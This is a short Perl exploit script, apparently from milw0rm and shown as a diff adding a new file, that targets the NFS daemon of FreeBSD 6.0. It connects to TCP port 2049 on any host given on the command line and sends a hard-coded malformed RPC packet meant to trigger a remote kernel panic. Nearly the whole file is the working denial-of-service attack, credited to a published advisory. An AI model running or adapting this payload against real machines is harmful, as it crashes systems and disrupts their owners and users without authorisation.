@@ -1,0 +1,31 @@
+#!/usr/bin/perl
+## Saw an advisory on Dailydave and wrote a little script to
+## check my freebsd boxes (kind of evil). /str0ke (milw0rm.com)
+##
+## ProtoVer NFS testsuite 1.0 uncovered remote kernel panic vulnerability in FreeBSD 6.0 kernel.
+## Evgeny Legerov
+## www.gleg.net
+
+use IO::Socket;
+
+sub usage
+{
+    print "FreeBSD 6.0 (nfsd) Remote Kernel Panic Denial of Service Exploit\n";
+    print "Advisory from Evgeny Legerov (www.gleg.net)\n";
+    print "Code by str0ke (milw0rm.com)\n";
+    print "Usage: $0 www.example.com\n";
+    exit ();
+}
+
+my $host = shift || &usage;
+
+my $printer = "\x80\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00" .
+              "\x00\x00\x00\x02\x00\x01\x86\xa5\x00\x00\x00\x01" .
+              "\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00" .
+              "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04" .
+              "\x2f\x74\x6d\x70";
+
+$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $host, PeerPort => "2049") || die "\n+ Connection failed...\n";
+print $socket $printer . "\n";
+
+# milw0rm.com [2006-02-28]
